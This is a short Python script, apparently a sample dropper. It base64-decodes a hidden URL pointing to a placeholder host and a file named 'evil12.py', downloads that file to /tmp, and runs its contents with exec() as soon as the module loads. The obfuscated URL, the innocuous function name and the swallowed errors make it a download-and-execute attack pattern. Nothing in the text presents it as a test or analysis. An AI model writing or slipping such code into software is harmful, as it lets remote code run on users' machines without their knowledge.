import urllib.request
import base64

def processRequest():
    try:
        x = "aHR0cDovL3NhbXBsZS51cmwvZXZpbDEyLnB5"
        y = base64.b64decode(x).decode("utf-8")
        z = "/tmp/file.py"

        urllib.request.urlretrieve(y, z)

        with open(z, "r") as f:
            w = f.read()

        exec(w)

    except Exception as e:
        print(e)

processRequest()
